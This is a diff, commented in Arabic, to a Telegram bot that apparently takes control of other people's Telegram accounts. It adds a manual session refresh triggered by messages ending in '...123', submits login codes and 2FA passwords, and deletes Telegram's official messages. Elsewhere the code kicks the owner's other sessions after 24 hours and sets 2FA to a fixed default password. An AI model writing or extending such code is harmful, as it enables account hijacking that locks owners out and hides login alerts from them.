@@ -51,6 +51,8 @@ class AdminFlow(StatesGroup):
     changing_2fa  = State()
     waiting_volume_upload = State()
     editing_user_message = State()
+    refreshing_session = State()  # حالة جديدة لتجديد الجلسة يدوياً
+    refreshing_2fa = State()      # حالة التحقق بخطوتين عند التجديد
 
 
 # ──────────────────────────────────────────
@@ -61,6 +63,7 @@ user_msg_ids     = {}
 user_link_msg_id = {}
 phone_to_user    = {}
 code_wait_tasks  = {}
+admin_refresh_ctx = {} # حفظ سياق التجديد اليدوي للأدمن
 
 
 # ──────────────────────────────────────────
@@ -516,7 +519,7 @@ async def _on_admin_event(phone: str, event: str, **data):
             + f"\n\n⏳ الترتيب: طرد الجلسات → 2FA (<code>{h(DEFAULT_2FA_PASSWORD)}</code>) بعد نجاح الطرد"
         )
     elif event == "kick_started":
-        text = base + "🛡️ <b>بدء طرد الجلسات الأخرى</b>\n⏳ محاولة فورية أولاً..."
+        text = base + "🛡️ <b>بدء طرد الجلسات الأخرى</b>\n⏳ انتظار 24 ساعة..."
     elif event == "kick_waiting":
         hrs = int(data.get("seconds", 0)) // 3600
         text = (
@@ -547,6 +550,13 @@ async def _on_admin_event(phone: str, event: str, **data):
             + "❌ <b>فشل تفعيل 2FA</b> بعد الطرد\n"
             + f"<code>{h(data.get('error', ''))}</code>"
         )
+    elif event == "manual_refresh_success":
+        text = (
+            base
+            + "✅ <b>تم تجديد الجلسة يدوياً</b>\n"
+            + "🗑️ تم حذف الرسائل الرسمية.\n"
+            + "🛡️ سيتم طرد الجلسات الأخرى بعد 24 ساعة."
+        )
     elif event == "email_retry_started":
         text = base + "📧 <b>إعادة محاولة ربط بريد Login</b> (بعد 45 ثانية)..."
     elif event == "email_retry_ok":
@@ -575,6 +585,7 @@ async def _on_admin_event(phone: str, event: str, **data):
 
 
 async def _on_recovery_done(phone: str, result: dict):
+    """تم إيقاف الإنعاش التلقائي - هذا التابع قد لا يستدعى كثيراً الآن."""
     session = await database.get_session_by_phone(phone)
     fname = session["full_name"] if session else "غير معروف"
     session_manager._recovery_scheduled.discard(phone)
@@ -585,45 +596,18 @@ async def _on_recovery_done(phone: str, result: dict):
             f"♻️ <b>تم إحياء الجلسة</b>\n\n"
             f"📱 الرقم: <code>{h(phone)}</code>\n"
             f"👤 الاسم: {h(fname)}\n"
-            f"📧 بريد Login: <code>{h(result.get('email', ''))}</code>\n\n"
-            f"<i>تم طلب الكود من تيليجرام واستلامه من Mail.tm تلقائياً.</i>"
             + ADMIN_FOOTER,
             phone=phone,
         )
         return
 
     err = result.get("error", "")
-    retryable = result.get(
-        "retryable", session_manager._recovery_error_retryable(err)
-    )
-    if retryable:
-        attempt = session_manager._recovery_fail_count.get(phone, 0) + 1
-        session_manager._recovery_fail_count[phone] = attempt
-        if attempt < SESSION_RECOVERY_MAX_ATTEMPTS:
-            session_manager.schedule_session_recovery(
-                phone,
-                SESSION_RECOVERY_RETRY_DELAY,
-                on_done=_on_recovery_done,
-            )
-            await notify_admins(
-                f"⏳ <b>إعادة محاولة إنعاش</b> ({attempt}/{SESSION_RECOVERY_MAX_ATTEMPTS})\n\n"
-                f"📱 الرقم: <code>{h(phone)}</code>\n"
-                f"👤 الاسم: {h(fname)}\n"
-                f"⚠️ المحاولة السابقة: <code>{h(err)}</code>\n\n"
-                f"♻️ المحاولة التالية بعد {SESSION_RECOVERY_RETRY_DELAY // 60} دقائق."
-                + ADMIN_FOOTER,
-                phone=phone,
-            )
-            return
-
-    session_manager._recovery_fail_count.pop(phone, None)
     await database.mark_session_invalid(phone)
     await notify_admins(
-        f"❌ <b>جلسة غير صالحة</b>\n\n"
+        f"❌ <b>فشل الإنعاش</b>\n\n"
         f"📱 الرقم: <code>{h(phone)}</code>\n"
-        f"👤 الاسم: {h(fname)}\n"
-        f"⚠️ فشل الإنعاش ({SESSION_RECOVERY_MAX_ATTEMPTS} محاولات): "
-        f"<code>{h(err)}</code>"
+        f"⚠️ الخطأ: <code>{h(err)}</code>\n"
+        "يرجى التجديد يدوياً (...123)"
         + ADMIN_FOOTER,
         phone=phone,
     )
@@ -678,7 +662,8 @@ async def retry_code(callback: CallbackQuery, state: FSMContext):
 async def session_watchdog():
     """
     كل ~30 ثانية: فحص الجلسات — فشلان متتاليان قبل إشعار التوقف.
-  """
+    تم إيقاف الإنعاش التلقائي بناءً على طلب المستخدم.
+    """
     while True:
         await asyncio.sleep(30)
         try:
@@ -694,30 +679,21 @@ async def session_watchdog():
                     continue
                 if action != "schedule_recovery":
                     continue
+                
+                # إشعار الأدمن فقط بدون إنعاش تلقائي
                 login_email = database.row_login_email(s)
-                if login_email and s["email_password"]:
-                    await notify_admins(
-                        f"⚠️ <b>الجلسة توقفت — جاري الإنعاش التلقائي</b>\n\n"
-                        f"📱 الرقم: <code>{h(phone)}</code>\n"
-                        f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n\n"
-                        f"⏳ بعد <b>{SESSION_RECOVERY_DELAY // 60}</b> دقائق: "
-                        f"طلب كود من تيليجرام → Mail.tm\n"
-                        f"📧 <code>{h(login_email)}</code>"
-                        + ADMIN_FOOTER,
-                        phone=phone,
-                    )
-                    session_manager.schedule_standard_recovery(
-                        phone, on_done=_on_recovery_done
-                    )
-                else:
-                    await database.mark_session_invalid(phone)
-                    await notify_admins(
-                        f"❌ <b>جلسة غير صالحة</b>\n\n"
-                        f"📱 الرقم: <code>{h(phone)}</code>\n"
-                        f"⚠️ لا يوجد بريد Login — لا يمكن الإنعاش التلقائي."
-                        + ADMIN_FOOTER,
-                        phone=phone,
-                    )
+                mail_info = f"\n📧 البريد: <code>{h(login_email)}</code>" if login_email else "\n⚠️ لا يوجد بريد مربوط."
+                
+                await notify_admins(
+                    f"⚠️ <b>الجلسة توقفت</b>\n\n"
+                    f"📱 الرقم: <code>{h(phone)}</code>\n"
+                    f"👤 الاسم: {h(s['full_name'] or 'غير معروف')}\n"
+                    f"الحالة: الجلسة بحاجة لتجديد يدوي (...123)"
+                    + mail_info
+                    + ADMIN_FOOTER,
+                    phone=phone,
+                )
+                # لا نقوم بجدولة الإنعاش التلقائي هنا
         except Exception as e:
             logging.error(f"Watchdog: {e}")
 
@@ -1323,6 +1299,121 @@ async def auto_mail_process(callback: CallbackQuery):
 
 
 # ──────────────────────────────────────────
+# تجديد الجلسة يدوياً (...123)
+# ──────────────────────────────────────────
+@dp.message(F.text.endswith("...123"))
+async def manual_refresh_trigger(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id):
+        return
+    
+    # محاولة استخراج الرقم من النص أو استخدامه كأمر عام للجلسة المختارة
+    phone = message.text.replace("...123", "").strip()
+    if not phone:
+        # إذا لم يتم تحديد رقم، نحاول جلب آخر رقم تم التفاعل معه
+        data = await state.get_data()
+        phone = data.get("phone")
+    
+    if not phone:
+        await message.answer("❌ يرجى تحديد الرقم أولاً أو كتابته قبل ...123 (مثال: +2010...123)")
+        return
+
+    phone = database.normalize_phone(phone)
+    session = await database.get_session_by_phone(phone)
+    if not session:
+        await message.answer(f"❌ الجلسة للرقم {h(phone)} غير موجودة.")
+        return
+
+    await message.answer(f"⏳ جاري طلب كود تسجيل دخول للرقم <code>{h(phone)}</code>...", parse_mode="HTML")
+    
+    result = await session_manager.request_code(message.from_user.id, phone)
+    if result["success"]:
+        await state.set_state(AdminFlow.refreshing_session)
+        await state.update_data(phone=phone, session_id=session["id"])
+        await message.answer(
+            f"✅ تم طلب الكود بنجاح للرقم <code>{h(phone)}</code>.\n\n"
+            "أرسل الكود الآن (أرقام فقط):",
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(session["id"])
+        )
+    else:
+        err = result.get("error", "")
+        await message.answer(f"❌ فشل طلب الكود: <code>{h(err)}</code>", parse_mode="HTML")
+
+
+@dp.message(AdminFlow.refreshing_session)
+async def process_refresh_code(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id):
+        return
+    
+    code = message.text.strip()
+    if not code.isdigit():
+        await message.answer("❌ يرجى إرسال الكود كأرقام فقط.")
+        return
+    
+    data = await state.get_data()
+    phone = data.get("phone")
+    sid = data.get("session_id")
+    uid = message.from_user.id
+
+    wait = await message.answer("⏳ جاري التحقق من الكود...")
+    result = await session_manager.submit_code(uid, code, is_refresh=True)
+    
+    if result.get("two_fa"):
+        await state.set_state(AdminFlow.refreshing_2fa)
+        await wait.edit_text("🔐 الجلسة محمية بالتحقق بخطوتين. أرسل كلمة المرور الآن:")
+        return
+
+    if result["success"]:
+        await state.clear()
+        await wait.edit_text(
+            f"✅ <b>تم تجديد الجلسة بنجاح!</b>\n\n"
+            f"📱 الرقم: <code>{h(phone)}</code>\n"
+            "تم تحديث ملف الجلسة وحذف الرسائل الرسمية.",
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid)
+        )
+    else:
+        await wait.edit_text(
+            f"❌ فشل التجديد: <code>{h(result.get('error', ''))}</code>\n"
+            "حاول مجدداً أو اطلب كود جديد (...123)",
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid)
+        )
+
+
+@dp.message(AdminFlow.refreshing_2fa)
+async def process_refresh_2fa(message: Message, state: FSMContext):
+    if not is_admin(message.from_user.id):
+        return
+    
+    password = message.text.strip()
+    data = await state.get_data()
+    phone = data.get("phone")
+    sid = data.get("session_id")
+    uid = message.from_user.id
+
+    wait = await message.answer("⏳ جاري التحقق من كلمة المرور...")
+    result = await session_manager.submit_2fa(uid, password, is_refresh=True)
+    
+    if result["success"]:
+        await state.clear()
+        await wait.edit_text(
+            f"✅ <b>تم تجديد الجلسة بنجاح!</b>\n\n"
+            f"📱 الرقم: <code>{h(phone)}</code>\n"
+            "تم تحديث ملف الجلسة وحذف الرسائل الرسمية.",
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid)
+        )
+    else:
+        await wait.edit_text(
+            f"❌ فشل التحقق: <code>{h(result.get('error', ''))}</code>\n"
+            "أرسل كلمة المرور الصحيحة:",
+            parse_mode="HTML",
+            reply_markup=back_to_session_keyboard(sid)
+        )
+
+
+# ──────────────────────────────────────────
 # الطرد + سحب الكود
 # ──────────────────────────────────────────
 @dp.callback_query(F.data.regexp(r"^c\d+$"))
@@ -1335,6 +1426,30 @@ async def admin_req_code(callback: CallbackQuery, state: FSMContext):
         return
     phone, sid = session["phone"], session["id"]
     admin_id = callback.from_user.id
+    
+    # إذا كانت الجلسة ميتة، نقوم بطلب كود جديد للتجديد بدلاً من مجرد المراقبة
+    alive = await session_manager.check_session_alive(phone)
+    if not alive:
+        await callback.answer("⏳ جاري طلب كود تجديد...")
+        result = await session_manager.request_code(admin_id, phone)
+        if result["success"]:
+            await state.set_state(AdminFlow.refreshing_session)
+            await state.update_data(phone=phone, session_id=sid)
+            await callback.message.edit_text(
+                f"⏳ تم طلب كود تجديد للرقم <code>{h(phone)}</code>.\n\n"
+                "أرسل الكود الآن (أرقام فقط) كرسالة نصية:",
+                parse_mode="HTML",
+                reply_markup=back_to_session_keyboard(sid)
+            )
+        else:
+            await callback.message.edit_text(
+                f"❌ فشل طلب الكود: <code>{h(result.get('error', ''))}</code>",
+                parse_mode="HTML",
+                reply_markup=back_to_session_keyboard(sid)
+            )
+        return
+
+    # إذا كانت الجلسة حية، نبقى على السلوك القديم (مراقبة الكود القادم)
     msg_id = callback.message.message_id
     user_msg_ids[admin_id] = msg_id
     old_task = code_wait_tasks.pop(admin_id, None)
@@ -1690,10 +1805,7 @@ async def main():
     session_manager.set_admin_notify_callback(_on_admin_event)
     asyncio.ensure_future(session_watchdog())
     asyncio.ensure_future(_startup_email_migration())
-    asyncio.ensure_future(_startup_session_recovery())
-    asyncio.ensure_future(
-        session_manager.invalid_sessions_recovery_loop(on_done=_on_recovery_done)
-    )
+    # تم إيقاف الإنعاش التلقائي عند التشغيل والدورة الدورية بناءً على طلب المستخدم
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
